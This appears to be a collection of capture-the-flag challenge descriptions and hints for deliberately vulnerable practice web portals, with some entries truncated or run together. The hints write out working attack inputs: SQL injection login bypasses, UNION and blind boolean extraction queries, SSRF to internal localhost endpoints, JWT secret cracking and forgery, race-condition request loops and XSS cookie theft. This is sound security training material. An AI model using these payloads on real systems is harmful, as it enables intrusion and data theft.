The Document Verifier fetches URLs server-side. Try fetching http://localhost:3000/internal/api/records?q=Eleanor%20Vance — the internal endpoint is only accessible from localhost.
The 'q' parameter in the internal records API is concatenated directly into a SQL query. Try injecting: ' OR 1=1 -- and compare the response with ' OR 1=0 -- to confirm blind boolean SQLi.

Extract the flag from the audit_secrets table using SUBSTR: use the SSRF to fetch http://localhost:3000/internal/api/records?q=' OR SUBSTR((SELECT content FROM audit_secrets WHERE classification='TOP_SECRET'),{pos},1)='{char}' --  and look for 'Citizen Record Found' vs 'No Citizen Record Found' to determine each character.

title: GovPortal — XSS to SQL Injection Chain
description: GovPortal is a government citizen services platform with permit tracking, public feedback, and administrative record searches. objectives: Create an account and explore the portal's features, including the feedback board and admin-restricted pages.
Exploit the stored XSS vulnerability in the feedback board to steal the Director's session cookie via the admin bot.
Use the stolen Director session to access the restricted Records Search page.
Exploit the SQL injection vulnerability in the search feature to discover hidden database tables and extract the flag.
hints: The Public Feedback board renders submitted content directly into the page without sanitization. Try submitting HTML tags and see what happens.
The admin bot at /bot/visit simulates the Director reviewing feedback. If your feedback contains a script that exfiltrates document.cookie to /webhook/collect, the bot will execute it. Try:
After triggering the bot, check the Webhook Log page. The captured data contains the Director's session cookie. Set it in your browser with document.cookie in the console.

The Records Search page at /admin/records builds SQL queries with your input directly. Try injecting a single quote to trigger an error, then use UNION SELECT with 5 columns. Use sqlite_master to discover all tables: ' UNION SELECT 1,name,sql,4,5 FROM sqlite_master--
Once you find the hidden table name and its columns, extract the flag with a UNION SELECT targeting that table's content column.

title: CivicGate — Insecure Tax Record Access

objectives: Log in to the portal using one of the demo citizen accounts.

Discover that changing the Record ID in the form lets you view other citizens' tax data.
Find the record belonging to a government director that contains the hidden flag.
hints: After logging in, check the Dashboard — it prominently displays your Tax Record ID number.
Go to the Tax Records page. Notice the form has your record ID pre-filled (e.g., 2002). Try changing it to a nearby number.
The records use sequential IDs. Your ID might be 2002 or 2003 — try lower numbers like 2001.
Record ID 2001 belongs to a government director. The flag is in the 'Auditor Remarks' field of that record.

Use the classic SQL injection payload as the username: ' OR 1=1 --  (with a space after the dashes). Enter anything as the password. This makes the SQL WHERE clause always true, returning the first user in the database — the Director.

title: GovConnect — Reflected XSS in Search

There is a hidden JavaScript variable called __INTERNAL_VERIFICATION__ on the search page. Since alert() is blocked in this environment, use: <script>document.getElementById('searchResults').innerText=__INTERNAL_VERIFICATION__</script>

title: TicketFlow — Forced Browsing to Admin Panel

title: SupportDesk — JWT Weak Secret Exploit
description: SupportDesk is an internal helpdesk portal for managing support tickets, agents, and escalations. The system uses JWT (HS256) for authentication — but the signing secret may not be as strong as it should be. Can you crack it and escalate your privileges to access the admin panel?

Locate your JWT authentication token and understand its structure.
Crack the JWT HMAC signing secret by testing common passwords.
Forge a new JWT token with admin privileges and access the restricted admin panel to retrieve the flag.
hints: Check the 'Session Info' page — it shows your full JWT token and how it's structured. The token is also stored in the 'hd_token' cookie.
The JWT payload contains a 'role' field. The admin panel requires role to be 'admin'. You need to change this, but the token is signed.
The HS256 algorithm uses a shared secret to sign and verify. If the secret is a common word, you can brute-force it. Try words like 'secret', 'password', 'key', 'admin', etc.

Use a tool like jwt.io, or write a script: try signing the header+payload with common secrets until the signature matches. The secret is one of the most commonly used words. Then forge a new token with role='admin' and set it as the hd_token cookie.

title: SupportDesk — Loyalty Program Race Condition
description: SupportDesk is a helpdesk management system with a built-in loyalty program that rewards agents with points for using promo codes. Agents can climb through tiers — Bronze, Silver, Gold, Platinum — with Platinum unlocking an exclusive Premium Hub. The loyalty system seems bulletproof: each promo code can only be redeemed once per user. But is the implementation truly airtight, or does the timing of the redemption process leave a crack?
objectives: Log in as a demo agent and explore the helpdesk system, especially the Loyalty Program page.
Understand the promo code redemption system and notice that the Premium Hub requires Platinum tier (2,500+ points).
Find the flaw in how the redemption endpoint processes codes — what happens if multiple requests arrive before the first one completes?
Exploit the race condition to accumulate enough points to reach Platinum tier and access the Premium Hub to retrieve the flag.
hints: The Loyalty Program page shows available promo codes and your current points. The SUPPORT2025 code is worth 500 points. With a starting balance of 450, one redemption only gets you to Silver.
Try accessing /premium directly — it tells you exactly how many points you need. The gap from ~450 to 2,500 is too large for a single code redemption.

Look at the redemption API endpoint POST /api/rewards/redeem. The server checks if you've already redeemed a code, credits points, then marks the code as used — but there's a delay between crediting and marking.

Send multiple simultaneous requests before the server marks the code as used. In the browser console: for(let i=0;i<8;i++){fetch('/api/rewards/redeem',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:'SUPPORT2025'})}).then(r=>r.json()).then(d=>console.log(d))}

title: NexusDesk — SSRF to SQL Injection Chain
description: NexusDesk is an internal helpdesk portal used by IT operations to track support tickets, manage agents, and validate links found in user submissions. The search endpoint's query parameter is concatenated directly into a SQL query. Try injecting a single quote to see if you get an error back through the Link Validator.

Use a UNION SELECT to extract data from other tables. The search returns 4 columns (id, subject, status, priority). Try: ' UNION SELECT id, entry, level, ref_date FROM escalation_logs -- and look for the CLASSIFIED entry.

title: HelpDeskPro — XSS to SQLi Escalation Chain
description: HelpDeskPro is an internal support ticket system used by a company's IT department. Agents create and manage support tickets, while admins have access to a powerful audit search tool. title: HelpDeskPro — Insecure Ticket Lookup
description: HelpDeskPro is an internal support operations portal where agents manage customer tickets, view internal notes, and collaborate on escalations. Find and access a ticket that is assigned to a different user — specifically one you shouldn't be able to read.
Retrieve the flag hidden in the internal notes of a restricted ticket.
hints: The Ticket Lookup page has a form field pre-filled with your own ticket ID. But what happens if you change that number?
Ticket IDs are sequential — yours might be 1003 or 1005, but there are tickets with lower IDs too (1001, 1002).
Try entering ticket ID 1001 in the lookup form. Does the server check that the ticket belongs to you before showing it?
The flag is in the internal notes of ticket #1001, which is assigned to the manager — just type 1001 in the Ticket ID field and click Lookup.

title: SupportFlow — SQL Injection Login Bypass
description: SupportFlow is an internal helpdesk portal used by support agents to manage tickets, escalations, and internal notes. The admin dashboard contains a confidential system report with a sensitive token. Can you bypass the login form and access the admin account without knowing the password?
objectives: Explore the login page and try the provided demo agent credentials to understand the application.
Identify that the login form may be vulnerable to SQL injection.
Craft a SQL injection payload to bypass authentication and log in as the administrator.
Access the admin dashboard and retrieve the confidential flag from the system report.
hints: Try entering a single quote (') in the username field and observe if you get an error — this is a classic sign of SQL injection.
The login query likely looks like: SELECT * FROM users WHERE username='...' AND password='...'. Think about how you can manipulate the WHERE clause.
The classic bypass payload is: ' OR 1=1 -- (note the space after --). Enter this as the username with any password.
The payload makes the query return all users. The first user in the database is the admin, so you'll be logged in as the administrator. The flag is on the admin dashboard.

title: NovaCare — Pharmacy Coupon Stacking
description: NovaCare is a hospital patient portal with an integrated pharmacy shop. Patients can browse health products, add them to their cart, and apply promotional coupon codes at checkout. The system correctly validates individual coupons, and the frontend only allows applying one — but is the server-side checkout logic equally strict? Find the business logic flaw and exploit it to unlock a hidden reward.
objectives: Log in to the patient portal and explore the pharmacy section.
Add items to your cart and proceed to the checkout page.
Observe how the coupon system works — note the available promotional codes and how the checkout request is structured.
Discover the business logic flaw in the checkout endpoint and exploit it to obtain the flag.
hints: The pharmacy page lists all available coupon codes and their percentages: WELLNESS10 (10%), NEWPATIENT15 (15%), HEALTH20 (20%), CARE25 (25%), SENIOR30 (30%).
The UI only lets you apply a single coupon, but inspect the fetch() request sent by the 'Place Order' button — notice the coupons field is sent as an array.
The server-side /api/checkout endpoint accepts an array of coupon codes and sums all their discount percentages. It does not enforce a single-coupon limit.

Send a manual request with all five coupons stacked: fetch('/api/checkout', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({coupons:['WELLNESS10','NEWPATIENT15','HEALTH20','CARE25','SENIOR30']}) }).then(r=>r.json()).then(console.log) — the total discount reaches 100%, triggering the special reward with the flag.

title: MedHub — SSRF to Blind SQLi Chain
description: MedHub is a hospital patient management portal used by physicians, nurses, and IT staff to manage patient records, appointments, and clinical notes. The system includes a Resource Checker tool and internal microservice APIs. A two-step exploit chain — combining Server-Side Request Forgery with Blind Boolean SQL Injection — can expose secrets buried deep in the database. Can you chain both vulnerabilities to extract the flag?
objectives: Log in with the provided demo credentials and explore the MedHub portal.
Discover the internal patient search API and find a way to reach it despite browser access being blocked.
Use the SSRF vulnerability to access the internal endpoint and confirm it responds to your queries.
Exploit a Blind Boolean SQL Injection in the internal search to extract the flag character by character from the system_secrets table.
hints: The API Reference page documents all endpoints, including an internal-only patient search at /internal/api/patient-search. Try accessing it directly — what happens?
The Resource Checker fetches URLs server-side. What if you point it at http://localhost:3000/internal/api/patient-search?q=MRN-20481 instead of an external URL?
The internal patient search concatenates your query directly into SQL. Try injecting a boolean condition: q=' OR 1=1 -- (should return found:true) vs q=' OR 1=2 -- (should return found:false).

Use blind boolean extraction: q=' OR SUBSTR((SELECT secret_value FROM system_secrets LIMIT 1),1,1)='T' -- and vary the position and character. The flag starts with TARANTU{. Automate with a script in the browser console.

title: MeridianHealth — XSS to SQLi Exploitation Chain
description: MeridianHealth is a hospital's internal clinical management portal used by doctors, nurses, and administrators. The system appears secure on the surface, but two hidden vulnerabilities can be chained together to access classified patient records. First, gain administrative access, then extract restricted data from the database. No single vulnerability alone will give you the flag.
objectives: Register or log in as a staff member and explore the portal's features.
Identify a user-input field that doesn't properly sanitize content.
Exploit the vulnerability to steal the administrator's session cookie.
Use the admin session to access a restricted area and extract the flag from the database.
hints: The Feedback Board allows staff to post messages. Notice that the feedback content is rendered without sanitization — try submitting HTML tags and see if they render.

The admin bot at /bot/visit simulates Dr. Harris (Administrator) reviewing the feedback page. If your feedback contains an XSS payload that exfiltrates cookies to /webhook/collect, the bot will execute it.
Try posting: — then visit /bot/visit to trigger the admin bot, and check /webhook for the captured session cookie.

Once you have the admin cookie (mv_session=...), set it in your browser to access /admin/records. The search feature builds SQL queries directly from your input — try a UNION-based injection to read from the restricted_records table.
The patients table has 6 columns. Try: ' UNION SELECT '1','2','3',content,'5','6' FROM restricted_records WHERE classification='TOP SECRET'-- in the search box to extract the flag.

title: MeridianMD — Blind Boolean SQL Injection
description: MeridianMD is a hospital's Electronic Health Records portal used by doctors and nurses to manage patients, appointments, and clinical notes. The Record Verification page lets staff check whether a patient ID exists in the system — but it never displays the actual data. Can you exploit the difference between 'Record found' and 'No records found' to extract a secret buried in the database, one character at a time?
objectives: Log in to the MeridianMD portal and explore the patient management features.
Find the Record Verification page and test how it responds to different inputs.
Identify a SQL injection vulnerability that produces boolean-based responses.
Discover the hidden 'flags' table and extract the flag character by character using blind boolean techniques.
hints: The Record Verification page at /records?id=... shows 'Record(s) verified' or 'No records found'. What happens if you append a single quote to a valid patient ID like P1001?
Compare the responses for P1001' AND 1=1 -- and P1001' AND 1=2 --. One returns 'record verified', the other returns 'no records found'. This confirms blind boolean SQL injection.
There is a table called 'flags' with a column called 'secret'. You can probe it: P1001' AND (SELECT COUNT(*) FROM flags)>0 --

Extract the flag one character at a time with SUBSTRING: P1001' AND SUBSTRING((SELECT secret FROM flags LIMIT 1),1,1)='T' --. The flag format is TARANTU{<32 hex chars>}, so test positions 1 through 42 against characters T,A,R,N,U,{,},a-f,0-9. Automate with a script for efficiency.

title: MediCare Central — Patient Record SQL Injection
description: MediCare Central is a hospital's internal electronic health records portal used by doctors and nurses to manage patient data. The Patient Records page includes a search feature to look up patients by name. Something about the way the search query is constructed might allow you to see records you're not supposed to see. Can you uncover the hidden record?
objectives: Log in to the MediCare Central portal using the provided demo credentials.
Navigate to the Patient Records page and observe that only active patients are shown.
Exploit the search field to bypass the active-only filter and reveal all records in the database.
Find the hidden archived record that contains the flag in its clinical notes.
hints: The search field filters patients by name using a SQL LIKE clause. Try entering a single quote (') and see what happens.
The underlying query looks something like: WHERE status = 'Active' AND name LIKE '%<your input>%'. Think about how you can break out of the LIKE pattern.
Try the classic SQL injection payload: %' OR 1=1 -- (this closes the LIKE, adds an always-true condition, and comments out the rest).
After a successful injection, look through all the returned records — especially any with an 'Archived' status. The flag is in the Notes column of the system audit record.

title: NexaHub — Forced Browsing to Admin Panel
description: NexaHub is a smart home IoT dashboard for managing connected devices, sensors, automation schedules, and firmware updates. The development team forgot to protect a sensitive admin page before pushing to production. Can you find the hidden admin panel and retrieve the system master key?
objectives: Log in to the NexaHub dashboard using the provided demo credentials.
Explore the application and discover a clue that reveals a hidden admin path.
Navigate to the unprotected admin page without needing admin credentials.
Retrieve the flag displayed on the admin panel.
hints: Not everything useful is visible on screen. Try viewing the HTML source of the login page — developers sometimes leave notes in comments.
There is a well-known file that web crawlers check, which sites use to list paths they want hidden from search engines. Try /robots.txt.
The login page source contains an HTML comment listing internal paths including one that is not in the sidebar navigation.
Navigate directly to /admin in your browser. Notice it loads without requiring any authentication — the developers forgot to add an auth check.

title: NexusHub — IoT Dashboard Exploit Chain
description: NexusHub is a smart home IoT control panel for monitoring devices, sensors, and automation schedules. The system uses JWT-based authentication with role-based access control. Some modules are restricted to engineers and admins. Can you chain multiple vulnerabilities to extract the classified secret from the database?
objectives: Log in with the demo credentials and explore the dashboard, devices, and session pages.
Examine your JWT token and find a way to escalate your role to 'engineer' to access restricted modules.
Use the Diagnostics module to discover a data extraction vulnerability.
Extract the flag from the database character by character.
hints: Visit the /session page to see your JWT token and its decoded payload. Note the algorithm used (HS256) and the role field.
The JWT HMAC secret is a very common word. Try cracking it with tools like jwt_tool, hashcat, or john — or just try common passwords like 'secret', 'password', 'key', etc.
Once you know the secret, forge a new JWT with the role set to 'engineer' and replace your iot_session cookie to access /diagnostics.
The Diagnostics log search builds SQL queries using your input directly. Try a boolean-based blind injection: Thermostat' AND SUBSTR((SELECT secret FROM flags LIMIT 1),1,1)='T' --
If the injection condition is true, you'll see 'Found X log entries'. If false, 'No log entries found'. Use this oracle to extract the flag one character at a time.
The flag format starts with TARANTU{ — use SUBSTR with increasing position values to extract each character of the secret from the flags table.

title: NexaHome Hub — SSRF to SQL Injection Chain
description: NexaHome is a smart home IoT control hub managing devices, sensors, and firmware updates. The hub exposes internal APIs for service-to-service communication — but a careless firmware update feature might let you reach endpoints you were never meant to access. Once inside, the database might have more to tell than just device data. Chain both vulnerabilities to recover the emergency override key.
objectives: Create an account and explore the hub dashboard, devices, and network diagnostics pages.
Discover the firmware update checker and understand how it makes server-side HTTP requests.
Use the firmware checker to reach an internal-only API endpoint that is blocked from direct browser access.
Exploit a SQL injection vulnerability in the internal endpoint to extract the flag from a hidden database table.
hints: The Network Diagnostics page documents an internal API endpoint at /internal/api/query that requires an X-Hub-Auth header. Try accessing it directly from your browser — you'll get a 403.
The Firmware checker on the /firmware page fetches any URL from the server side. What happens if you point it at http://localhost:3000/internal/api/query?category=all?
The 'category' parameter in the internal endpoint appears to be directly inserted into a SQL query. Try category values like: sensor' OR '1'='1 to see if the query behavior changes.
Use UNION SELECT to enumerate tables: category=' UNION SELECT 1,name,sql,4,5,6 FROM sqlite_master--   Then extract the flag from the discovered table using another UNION query.

title: NexaHome — IoT Dashboard Exploit Chain
description: NexaHome is a smart home IoT control panel used to monitor devices, sensors, schedules, and firmware updates. The platform has multiple low-severity issues that individually seem harmless — but chaining them together lets an attacker escalate from a regular operator account all the way to extracting secrets from a hidden system account. Can you chain stored XSS and IDOR to capture the flag?
objectives: Create an account or log in with demo credentials and explore the IoT dashboard.
Find a way to inject a malicious payload into user-generated content that an admin bot will execute.
Steal the admin's session cookie and use it to access admin-only features.
Discover a hidden system account through the admin API and extract the flag from its private configuration.
hints: The Device Logs page lets you submit incident reports. Look carefully at how the description field is rendered — is it escaped?
There's a /bot/visit endpoint that triggers an admin bot to review the device logs page. If your payload exfiltrates cookies to /webhook/collect, the bot will simulate execution.
After stealing the admin session cookie, set it in your browser (document.cookie = 'iot_session=<stolen_token>') and visit /admin/users to see the admin panel.
The admin UI only shows non-system users, but the API endpoint /api/admin/users/:id doesn't filter by role. Try IDs like 1 to find a hidden system account with the flag in its privateConfig.

title: NexusHub — DOM-Based XSS in IoT Dashboard
description: NexusHub is a smart home control panel for managing IoT devices, sensors, schedules, and firmware. The server-side code appears to be properly secured — all outputs are escaped. However, a piece of client-side JavaScript on one of the pages reads user input from the URL and inserts it into the DOM unsafely. Exploit this DOM-based XSS to steal the administrator's secret cookie containing the flag.
objectives: Log into the dashboard and explore the various pages — Devices, Sensors, Schedules, Firmware.
Find a page where client-side JavaScript processes URL query parameters and inserts them into the DOM.
Confirm the DOM XSS vulnerability by crafting a payload that executes JavaScript in the browser.
Use the Report Link feature to have the admin bot visit your crafted URL, exfiltrating the admin's cookies to the data collector.
Retrieve the flag from the collected data.
hints: The Devices page has a search feature. Try searching for something and notice how the URL changes. Inspect the page source to see how the search query is handled in JavaScript.
Look at the applyFilter function in the client-side script. It builds HTML using string concatenation with the raw query value and inserts it via innerHTML — this is a classic DOM XSS sink.
Craft a payload like: /devices?q= — this will execute when the page loads with that query parameter.

Go to the Report Link page and submit your crafted URL. The admin bot will 'visit' it. Then click 'Refresh Collections' to see the admin's stolen cookies, which include the flag in the device_master_key cookie.

title: TalentForge — JWT Forgery & Blind SQLi Chain
description: TalentForge is a professional recruitment platform with job listings, candidate profiles, and employer dashboards. The platform uses JWT tokens for authentication and role-based access control. Regular candidates can browse jobs, but only recruiters can search the talent pool. Something about the authentication seems fragile, and the recruiter search might be hiding more than candidates. Chain together two vulnerabilities to extract the hidden flag.
objectives: Log in with the provided demo credentials and explore the application.
Examine your authentication token and find a way to escalate your role to recruiter.
Access the recruiter candidate search and discover a data extraction vulnerability.
Extract the flag from the database one character at a time using the search oracle.
hints: Visit the /session page to inspect your JWT token. Note the algorithm (HS256) and your current role in the payload.
HS256 JWTs are signed with a shared secret. If the secret is a common word, tools like hashcat or jwt-cracker can recover it. Try words like 'secret', 'password', 'key', or 'admin'.
Once you crack the secret, forge a new JWT with the role set to 'recruiter'. Set it as the tf_session cookie to access the candidate search.
The recruiter search filters candidates by department. Notice how the response differs between 'Found' and 'No candidates found' — this is a boolean oracle.
Try injecting SQL into the department parameter: Engineering' AND 1=1 -- (found) vs Engineering' AND 1=2 -- (not found). The database has a 'flags' table with a 'secret' column.

Extract the flag character by character: Engineering' AND SUBSTR((SELECT secret FROM flags LIMIT 1),{position},1)='{char}' -- . The /api/recruiter/candidates endpoint returns JSON which is easier to script against.

title: HireVault — XSS to IDOR Exploit Chain
description: HireVault is a talent acquisition platform where candidates apply for jobs and admins review applications. Craft an XSS payload that sends the admin's cookie to the webhook: — then trigger /bot/visit and check /webhook for the stolen session.

With the admin's session cookie, access /api/candidates/:id. The admin UI only shows active candidates starting at ID 3, but what about lower IDs? Try /api/candidates/1 to find an archived profile with the flag.

title: HireHorizon — SQL Injection Login Bypass
description: HireHorizon is a modern job board and talent management platform. The admin dashboard contains sensitive platform secrets, but you only have access to demo employer and job seeker accounts. Can you find a way to bypass the login and access the admin panel?

Identify how the login form processes user input and find a weakness in the authentication logic.
Craft a payload that bypasses the login and grants you admin access.
Retrieve the flag displayed on the admin dashboard.
hints: The login form sends your username and password directly to the server. What happens if the server builds its SQL query by concatenating your input?
Try entering a single quote (') in the username field. Does the application behave differently or show an error?
A classic SQL injection payload for login bypass is: ' OR 1=1 -- (with a space after the dashes). This makes the WHERE clause always true.
Enter ' OR 1=1 -- as the username and anything as the password. The query will return the first user in the database — the admin — bypassing authentication entirely.

title: Thornfield Library — Workflow Bypass
description: Thornfield Library's Special Collections Portal manages access to rare and vault-level manuscripts through a strict 4-step approval workflow: Submit → Review → Approve → Execute. The UI enforces this sequence, but does the API? Somewhere in the chain, a step might not verify that its predecessors were completed. Find the flaw and gain unauthorized access to the vault collection.
objectives: Log in and explore the library portal — catalog, special requests, and API documentation.
Submit a new request for a Vault Collection item (e.g., The Meridian Codex).
Understand the 4-step approval workflow and identify which endpoint skips validation.
Bypass the approval chain to execute your request and retrieve the flag from the vault materials.
hints: The API documentation page lists all workflow endpoints. Notice which ones mention role requirements and which only mention authentication.
Submit a request for 'The Meridian Codex' (BK-007). Note the request ID returned in the response.
The review and approve endpoints properly check both permissions and request status. But what about the execute endpoint? Try calling it directly on your newly submitted request.

Use the browser console: fetch('/api/requests/REQ-XXXX/execute', { method: 'POST' }).then(r => r.json()).then(console.log) — replace REQ-XXXX with your request ID. The endpoint only checks authentication, not approval status.

title: Alexandria Library — JWT Forgery & IDOR Chain
description: The Alexandria Digital Library is a member portal for browsing books, managing loans, and reservations. The library's staff panel is restricted to authorized librarians — but the authentication mechanism may not be as strong as it seems. Can you chain multiple vulnerabilities together to access a hidden member's private records?
objectives: Create an account or log in with the demo credentials and explore the library portal.
Examine how the application handles authentication and session management.
Find a way to elevate your privileges to access the staff-only panel.
Use the staff panel to discover and access a hidden member's private data containing the flag.
hints: Check the Session Info page — it shows your JWT token and its decoded payload. Notice the role field and the signing algorithm (HS256).
HS256 JWTs are signed with a symmetric secret. If that secret is a common word, it can be cracked offline. Try tools like hashcat, john, or jwt_tool with a common wordlist.
Once you know the signing secret, forge a new JWT with an elevated role (e.g., 'librarian') and replace your alx_token cookie. This unlocks the Staff Panel.
The Staff Panel shows members starting from ID 2. But the Member Lookup API accepts any ID — try ID 1 to find a hidden founding member whose private notes contain something interesting.

title: PageVault — Library Catalog Breach
description: PageVault is a digital library management system used by staff to manage the book catalog, track loans, and validate external resource links. A restricted internal search service powers the catalog indexer — but it was never meant to be accessed directly. Can you chain two vulnerabilities together to breach the system and extract the classified archive flag?
objectives: Log in to the PageVault portal and explore the available features and tools.
Discover a way to access the restricted internal catalog search endpoint that blocks direct browser requests.
Exploit the internal search endpoint to extract sensitive data from a hidden database table.
Retrieve the flag from the restricted records.
hints: The API Reference page documents both public and internal endpoints. Notice that /internal/catalog/search requires a special header — but can you make the server send a request on your behalf?
The Resource Link Validator on the Tools page fetches any URL from the server side. What if you point it at http://localhost:3000/internal/catalog/search?q=test?
The internal search endpoint builds its SQL query using string concatenation. Try injecting a single quote to see if the query breaks, then craft a UNION SELECT.

The flag is stored in a table called restricted_records with columns: id, record_type, record_key, record_value, classification. The search query returns 5 columns — use a matching UNION SELECT to extract the data.

title: SoundWave — XSS to SQL Injection Chain
description: SoundWave is a music streaming analytics platform where artists manage tracks, fans post reviews, and admins handle royalty payments. The platform has two vulnerabilities that, when chained together, lead to a full data breach. A stored XSS in user reviews can hijack the admin's session, and the admin royalty dashboard contains a SQL injection flaw hiding a secret flag.
